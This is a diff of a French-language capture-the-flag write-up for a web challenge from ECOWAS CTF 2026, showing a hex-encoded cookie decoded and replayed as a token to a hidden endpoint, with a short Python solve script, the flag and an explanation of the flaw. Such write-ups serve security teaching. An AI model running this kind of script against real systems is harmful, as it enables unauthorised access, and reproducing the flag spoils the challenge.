@@ -14,50 +14,83 @@ toc: true
 
 ## Description
 
-Une application web collecte des cookies. Mais pas seulement les vôtres.
+Live web challenge at `http://labs.ecowasctf.com.gh:5002/`
 
 ---
 
-## Analyse
+## Reconnaissance
 
-En inspectant l'application, on remarque que les **cookies** renvoyés par le serveur sont encodés en hexadécimal. Après décodage, on obtient un chemin d'accès caché.
+On visite `GET /` :
 
----
-
-## Solution
-
-### Étape 1 — Récupérer le cookie
-
-```bash
-curl -v http://challenge-url/ 2>&1 | grep "Set-Cookie"
+```http
+HTTP/1.1 200 OK
+Set-Cookie: token=54686973206973206120736563726574
 ```
 
-Le cookie renvoyé est de la forme : `session=<hex-string>`
-
-### Étape 2 — Décoder
+Le cookie `token` est une chaîne hexadécimale.
 
 ```python
-hex_value = "2f68696464656e"  # exemple
-print(bytes.fromhex(hex_value).decode())
-# → /hidden
+bytes.fromhex("54686973206973206120736563726574")
+# → b'This is a secret'
 ```
 
-### Étape 3 — Accéder à l'endpoint caché
+Dans le HTML de la page, un lien caché :
 
-```bash
-curl http://challenge-url/hidden
+```html
+<a href="/hidden">hidden</a>
 ```
 
-Réponse : flag directement dans le corps de la réponse.
+---
+
+## Exploitation
+
+En visitant `/hidden` sans token → message d'erreur :
+
+```
+Hi hacker, the server expects a 'token'
+```
+
+En passant le token décodé comme paramètre GET :
+
+```
+GET /hidden?token=This is a secret HTTP/1.1
+```
+
+Réponse :
+
+```
+Well done! Here's your pass: EcowasCTF{c00kie_c0llect0r_m@st3R>!}
+```
+
+---
+
+## Script de solve
+
+```python
+import requests, binascii
+
+r = requests.get("http://labs.ecowasctf.com.gh:5002/")
+hex_token = r.cookies['token']
+decoded = binascii.unhexlify(hex_token).decode()   # "This is a secret"
+
+r2 = requests.get(f"http://labs.ecowasctf.com.gh:5002/hidden?token={decoded}")
+print(r2.text)  # flag
+```
 
 ---
 
 ## Flag
 
-```text
+```
 EcowasCTF{c00kie_c0llect0r_m@st3R>!}
 ```
 
 ---
 
-**[← Retour à l'index ECOWAS CTF 2026](/portfolio/blog/posts/ecowas-ctf-2026/)**
+## Vulnérabilité
+
+Le serveur stocke un secret en clair encodé en hex dans un cookie côté client. Il suffit de décoder le cookie et de le renvoyer comme paramètre GET — pas d'authentification serveur réelle.
+
+---
+
+**[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**
